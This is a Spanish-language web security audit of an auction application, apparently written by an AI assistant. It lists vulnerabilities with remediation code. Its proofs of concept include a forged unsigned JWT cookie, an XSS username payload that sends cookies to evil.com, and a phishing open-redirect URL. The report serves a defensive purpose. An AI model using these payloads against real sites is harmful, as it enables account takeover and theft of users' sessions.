# 🔒 Auditoría de Seguridad Web - Iron Loot

**Fecha:** Enero 2026  
**Versión Auditada:** 0.2.3  
**Alcance:** Componente Web (Frontend + SSR)  
**Criticidad General:** 🔴 **CRÍTICA**

---

## 📋 Resumen Ejecutivo

Se identificaron **22 vulnerabilidades** distribuidas de la siguiente manera:

| Severidad | Cantidad | Acción Requerida |
|-----------|----------|------------------|
| 🔴 Crítica | 3 | Inmediata |
| 🟠 Alta | 6 | < 48 horas |
| 🟡 Media | 8 | < 1 semana |
| 🔵 Baja | 5 | < 1 mes |

---

## 🔴 VULNERABILIDADES CRÍTICAS

### CRIT-01: Autenticación JWT Sin Verificación de Firma

**Archivo:** `src/common/middleware/user.middleware.ts`  
**Líneas:** 12-27  
**CVSS:** 9.8 (Crítico)

#### Descripción
El middleware de autenticación usa `jwt.decode()` en lugar de `jwt.verify()`, lo que significa que **NO SE VERIFICA LA FIRMA DEL TOKEN**. Cualquier atacante puede forjar tokens JWT con payloads arbitrarios.

#### Código Vulnerable
```typescript
// Línea 15-16: SOLO decodifica, NO verifica
const decoded = jwt.decode(token);

if (decoded) {
     // ... acepta el token sin verificar firma
     req['user'] = decoded;
}
```

#### Impacto
- **Bypass completo de autenticación**: Un atacante puede crear tokens con cualquier identidad
- **Escalada de privilegios**: Puede establecer `isSeller: true`, `isAdmin: true`
- **Suplantación de identidad**: Puede hacerse pasar por cualquier usuario

#### Prueba de Concepto
```javascript
// Crear token falso sin secreto
const fakePayload = {
  sub: "admin-uuid",
  email: "admin@ironloot.com",
  isSeller: true,
  displayName: "Admin Falso",
  emailVerified: true,
  exp: Math.floor(Date.now() / 1000) + 86400
};

const fakeToken = btoa(JSON.stringify({alg:"none"})) + "." + 
                  btoa(JSON.stringify(fakePayload)) + ".";

// Este token será aceptado como válido
document.cookie = `access_token=${fakeToken}; path=/`;
```

#### Remediación
```typescript
import * as jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET; // Debe existir en env

export class UserMiddleware implements NestMiddleware {
  use(req: Request, res: Response, next: NextFunction) {
    const token = req.cookies['access_token'];

    if (token) {
      try {
        // ✅ CORRECTO: Verificar firma con secreto
        const decoded = jwt.verify(token, JWT_SECRET, {
          algorithms: ['HS256'],
          issuer: 'ironloot',
        });
        
        req['user'] = decoded;
        res.locals.user = decoded;
      } catch (err) {
        // Token inválido o expirado - no autenticar
        res.locals.user = null;
        req['user'] = null;
      }
    }
    next();
  }
}
```

---

### CRIT-02: Cross-Site Scripting (XSS) - Múltiples Ubicaciones

**CVSS:** 8.1 (Alto)

Se identificaron **15+ instancias** de XSS Stored/Reflected en el código JavaScript del cliente.

#### Ubicaciones Afectadas

| Archivo | Línea | Campo Vulnerable |
|---------|-------|------------------|
| `pages/auction-detail.js` | 103-116 | `bid.bidder.username` |
| `pages/auctions.js` | 285 | `auction.title` |
| `pages/auctions.js` | 278 | `imageUrl` (en atributo) |
| `pages/orders/list.js` | 34 | `order.itemSnapshot.title` |
| `pages/notifications/list.js` | 44-45 | `notif.title`, `notif.message` |
| `pages/reputation.js` | 50-60 | `rating.reviewer.username` |
| `pages/won-auctions.js` | 37-55 | Múltiples campos |
| `pages/dashboard.js` | 98-108 | `notif.title` |
| `core/utils.js` | 290-296 | `message` en toast() |

#### Ejemplo de Código Vulnerable
```javascript
// pages/auction-detail.js línea 103-116
container.innerHTML = bids.slice(0, 10).map((bid, index) => `
    <div class="bid-item">
      <p class="font-medium">${bid.bidder?.username || 'Usuario'}</p>  // ❌ XSS
      ...
    </div>
`).join('');
```

#### Prueba de Concepto
Un atacante puede registrarse con el username:
```
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

Cuando otros usuarios vean sus pujas, el JavaScript se ejecutará y robará sus cookies/tokens.

#### Remediación Global

1. **Crear función de escape centralizada:**
```javascript
// Añadir a utils.js
const Utils = {
  // ... código existente ...
  
  /**
   * Escape HTML para prevenir XSS
   */
  escapeHtml(unsafe) {
    if (unsafe === null || unsafe === undefined) return '';
    return String(unsafe)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  },
  
  /**
   * Escape para atributos de URL
   */
  escapeAttr(unsafe) {
    if (unsafe === null || unsafe === undefined) return '';
    return encodeURIComponent(String(unsafe));
  }
};
```

2. **Usar en todo el código:**
```javascript
// ✅ CORRECTO
container.innerHTML = bids.map((bid) => `
    <p class="font-medium">${Utils.escapeHtml(bid.bidder?.username)}</p>
`).join('');
```

3. **Alternativa más segura - usar textContent:**
```javascript
const p = document.createElement('p');
p.className = 'font-medium';
p.textContent = bid.bidder?.username || 'Usuario'; // Nunca interpreta HTML
container.appendChild(p);
```

---

### CRIT-03: Cookie de Sesión Sin Flags de Seguridad

**Archivo:** `public/js/core/api-client.js`  
**Líneas:** 155-163  
**CVSS:** 7.5 (Alto)

#### Descripción
Las cookies de autenticación se crean sin los flags de seguridad esenciales.

#### Código Vulnerable
```javascript
function _setCookie(name, value, days) {
    let expires = "";
    if (days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    // ❌ Falta HttpOnly, Secure, SameSite=Strict
    document.cookie = name + "=" + (value || "") + expires + "; path=/; SameSite=Lax";
}
```

#### Impacto
- **Sin HttpOnly**: JavaScript puede leer la cookie (XSS puede robar tokens)
- **Sin Secure**: Cookie enviada en conexiones HTTP no cifradas
- **SameSite=Lax**: Permite algunos ataques CSRF

#### Remediación
La cookie debe ser establecida **desde el servidor**, no desde JavaScript:

```typescript
// En el backend después del login
res.cookie('access_token', token, {
  httpOnly: true,      // JavaScript no puede acceder
  secure: true,        // Solo HTTPS
  sameSite: 'strict',  // Protección CSRF completa
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 días
  path: '/',
});
```

---

## 🟠 VULNERABILIDADES ALTAS

### HIGH-01: Open Redirect - Múltiples Ubicaciones

**Archivos Afectados:**
- `public/js/core/auth.js` línea 66-67
- `public/js/flows/auth.flow.js` línea 72-73
- `public/js/pages/notifications/list.js` línea 82-84

#### Código Vulnerable
```javascript
// auth.js línea 66-67
const returnUrl = new URLSearchParams(window.location.search).get('return') || '/dashboard';
window.location.href = returnUrl;  // ❌ Open Redirect
```

#### Prueba de Concepto
```
https://ironloot.com/login?return=https://evil-phishing.com/fake-ironloot
```

El usuario es redirigido a un sitio de phishing después de autenticarse.

#### Remediación
```javascript
function safeRedirect(url, defaultUrl = '/dashboard') {
  // Solo permitir URLs relativas que empiecen con /
  if (url && url.startsWith('/') && !url.startsWith('//')) {
    // Validar que no contenga caracteres peligrosos
    const cleanUrl = url.split('?')[0]; // Opcionalmente preservar query
    if (/^\/[a-zA-Z0-9\-_\/]*$/.test(cleanUrl)) {
      return url;
    }
  }
  return defaultUrl;
}

// Uso
const returnUrl = safeRedirect(
  new URLSearchParams(window.location.search).get('return')
);
window.location.href = returnUrl;
```

---

### HIGH-02: Tokens Almacenados en localStorage

**Archivo:** `public/js/core/api-client.js`  
**Líneas:** 17-18, 27-28

#### Descripción
Los tokens JWT se almacenan en `localStorage`, que es accesible desde cualquier script JavaScript, incluyendo scripts inyectados vía XSS.

#### Código Vulnerable
```javascript
const ACCESS_TOKEN_KEY = 'ironloot_access_token';
const REFRESH_TOKEN_KEY = 'ironloot_refresh_token';

let accessToken = localStorage.getItem(ACCESS_TOKEN_KEY);
let refreshToken = localStorage.getItem(REFRESH_TOKEN_KEY);
```

#### Remediación
- Usar cookies HttpOnly para el access token
- Para el refresh token, considerar almacenamiento en memoria + rotación frecuente
- Implementar mecanismo de "silent refresh" usando iframes

---

### HIGH-03: Archivo .env No Ignorado en .gitignore

**Archivo:** `.gitignore`

#### Descripción
El archivo `.env` no está incluido en `.gitignore`, lo que significa que puede ser committeado accidentalmente al repositorio.

#### Remediación
```gitignore
# Agregar a .gitignore
.env
.env.local
.env.*.local
```

---

### HIGH-04: Sin Content Security Policy (CSP)

**Archivo:** `views/layouts/base.html`

#### Descripción
No existe ninguna política de seguridad de contenido (CSP) que limite qué scripts pueden ejecutarse.

#### Remediación
Agregar en `main.ts`:
```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Reducir progresivamente
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", process.env.VITE_API_URL],
    },
  },
}));
```

---

### HIGH-05: Error de Sintaxis en auth.flow.js

**Archivo:** `public/js/flows/auth.flow.js`  
**Línea:** 126

#### Descripción
Falta una llave de cierre `}` después de la función `verifyEmail`, causando que `forgotPassword` y `resetPassword` estén incorrectamente anidadas.

```javascript
// Línea ~123-126
async function verifyEmail({ token }) {
    try {
        // ...
        return true;
    } catch (error) {
        throw error;
    }
// ❌ Falta: }

async function forgotPassword(email) {  // Incorrectamente anidada
```

---

### HIGH-06: Verificación de Vendedor Solo en Cliente

**Archivos:**
- `public/js/pages/auction/create.js` línea 7
- `public/js/flows/auction.flow.js` línea 54

#### Descripción
La verificación de si un usuario es vendedor solo se hace en el cliente (JavaScript), lo cual puede ser bypaseado fácilmente.

```javascript
// Fácilmente bypasseable
if (!Auth.isSeller()) {
    Utils.toast('Debes ser vendedor...', 'error');
    return;
}
```

#### Remediación
La verificación **debe** hacerse en el backend. El frontend solo debe usarse para UX, nunca para control de acceso.

---

## 🟡 VULNERABILIDADES MEDIAS

### MED-01: Sin Rate Limiting

El proxy API no implementa rate limiting, permitiendo ataques de fuerza bruta.

### MED-02: Sin Protección CSRF Explícita

Aunque `SameSite=Lax` provee algo de protección, no hay tokens CSRF explícitos.

### MED-03: Información de Debug en Errores

Los errores de API se muestran directamente al usuario sin sanitizar.

### MED-04: Manejo Inseguro de FormData

`dispute.service.js` línea 39 envía FormData sin validación de tipo de archivo.

### MED-05: setTimeout con Strings

Varios archivos usan `setTimeout` con delays fijos que podrían ser explotados.

### MED-06: Validación de Email Solo en Cliente

La validación de formato de email solo ocurre en el frontend.

### MED-07: Sin Sanitización de Parámetros de URL

Los IDs de subasta, orden, etc. se extraen de la URL sin validación.

### MED-08: Cache de Assets Deshabilitado

```typescript
// main.ts - Cache completamente deshabilitado
app.useStaticAssets(join(__dirname, '..', 'public'), {
  maxAge: 0,  // Impacta performance
});
```

---

## 🔵 VULNERABILIDADES BAJAS

### LOW-01: Headers de Seguridad Faltantes

No se envían headers como:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Referrer-Policy: strict-origin-when-cross-origin`

### LOW-02: Dependencias Potencialmente Desactualizadas

Verificar vulnerabilidades conocidas en dependencias con `npm audit`.

### LOW-03: Console.log en Producción

Múltiples `console.error` y `console.warn` que podrían filtrar información.

### LOW-04: Versión de Node/npm No Bloqueada

No hay `.nvmrc` ni `engines` en `package.json`.

### LOW-05: Sin Manejo de Errores de Red

Las llamadas API no manejan todos los casos de error de red.

---

## 📊 Matriz de Riesgos

```
Probabilidad
     Alta   │ MED-01,02 │ CRIT-02   │ CRIT-01    │
            │           │ HIGH-01   │            │
   Media    │ LOW-01-05 │ HIGH-02-04│ CRIT-03    │
            │           │ MED-03-08 │            │
    Baja    │           │ HIGH-05,06│            │
            └───────────┴───────────┴────────────┤
                 Bajo      Medio       Alto
                        Impacto
```

---

## ✅ Recomendaciones Prioritarias

### Fase 1 - Inmediato (0-24 horas)
1. ✅ Implementar `jwt.verify()` en lugar de `jwt.decode()`
2. ✅ Configurar cookies HttpOnly desde el servidor
3. ✅ Agregar `.env` a `.gitignore`

### Fase 2 - Urgente (24-72 horas)
4. Implementar función de escape HTML centralizada
5. Corregir todas las instancias de innerHTML vulnerable
6. Implementar validación de Open Redirect

### Fase 3 - Importante (1 semana)
7. Agregar CSP y otros headers de seguridad
8. Implementar rate limiting
9. Agregar validación de backend para roles
10. Implementar CSRF tokens

### Fase 4 - Mejora Continua
11. Configurar `npm audit` en CI/CD
12. Implementar tests de seguridad automatizados
13. Documentar políticas de seguridad
14. Capacitar al equipo en desarrollo seguro

---

## 📁 Archivos de Referencia para Correcciones

Se recomienda crear los siguientes archivos de seguridad:

```
web/
├── src/
│   ├── common/
│   │   ├── guards/
│   │   │   └── require-auth.guard.ts  # Actualizar
│   │   ├── middleware/
│   │   │   └── user.middleware.ts     # CRÍTICO: Actualizar
│   │   └── security/
│   │       ├── helmet.config.ts       # Nuevo
│   │       └── csrf.middleware.ts     # Nuevo
├── public/
│   └── js/
│       └── core/
│           └── utils.js               # Agregar escapeHtml
└── .env.example                        # Nuevo (template sin secretos)
```

---

## 🔐 Checklist de Seguridad Pre-Producción

- [ ] JWT verificado con secreto en servidor
- [ ] Cookies HttpOnly, Secure, SameSite=Strict
- [ ] CSP implementado
- [ ] Escape HTML en todas las salidas dinámicas
- [ ] Rate limiting en endpoints sensibles
- [ ] HTTPS forzado
- [ ] `.env` no en repositorio
- [ ] `npm audit` sin vulnerabilidades críticas/altas
- [ ] Logging sin información sensible
- [ ] Manejo de errores sin stack traces

---

**Auditor:** Claude (Anthropic)  
**Siguiente Revisión Recomendada:** Después de implementar Fase 1 y 2
